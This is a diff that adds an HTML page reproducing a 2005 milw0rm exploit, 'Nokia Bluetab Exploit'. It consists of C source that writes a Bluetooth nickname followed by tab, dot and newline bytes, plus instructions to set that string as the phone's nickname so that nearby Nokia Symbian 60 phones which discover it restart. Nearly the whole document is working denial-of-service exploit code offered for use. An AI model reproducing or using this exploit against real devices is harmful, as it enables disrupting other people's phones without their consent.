@@ -1,0 +1,72 @@
+<html>
+<head>
+<title>Nokia Symbian 60 (Bluetooth Nickname) Remote Restart (update)</title>
+<pre>
+/*
+      Nokia Bluetab Exploit 
+      Found &amp; coded by Qnix
+ 
+ - This Exploit will creat file called bluetab.txt with your 
+   bluetooth nickname, send the file to your nokia mobile
+   open it copy the nickname and paste it to your bluetooth
+   nickname, if any one search and find your nickname his
+   mobile will restart .
+ - this exploit work on many other symbian and java mobiles .
+
+   Qnix - Qnix@bsdmail.org
+
+*/
+
+#include &lt;stdio.h&gt;
+#define  tab1 0x09
+#define  tab2 0x2E
+#define  dot1 0x0A
+
+int main(int argc,char *argv[])
+{
+
+ FILE *bluetab;
+
+ if(argc &lt; 2)
+ { 
+   msgm();
+   printf(&quot;Useage : ./bluetab &lt;nickname&gt;\n&quot;);
+   return 0;
+ } 
+ else
+ { 
+   msgm();
+   printf(&quot;bluetab.txt file created with your nickname . \n&quot;);
+ }
+ 
+ bluetab = fopen(&quot;bluetab.txt&quot;,&quot;w&quot;);
+ if(!bluetab)
+ {
+   msgm();  
+   printf(&quot;Some kind of file error!\n&quot;);
+   return 0;
+ }
+
+ 
+ fprintf(bluetab,&quot;%s%c%c%c&quot;,argv[1],tab1,tab2,dot1); 
+ fclose(bluetab);
+ return 0;
+ 
+}
+
+msgm()
+{
+
+  printf(&quot; ------------------------------- \n&quot;);
+  printf(&quot;     Nokia Bluetab Exploit       \n&quot;);
+  printf(&quot;       found &amp; coded by          \n&quot;);
+  printf(&quot;       Qnix@bsdmail.org          \n&quot;);
+  printf(&quot; ------------------------------- \n\n&quot;);
+}
+
+/* v1 2005-03-04 milw0rm.com */
+
+// milw0rm.com [2005-09-23]
+</pre>
+</html>
+
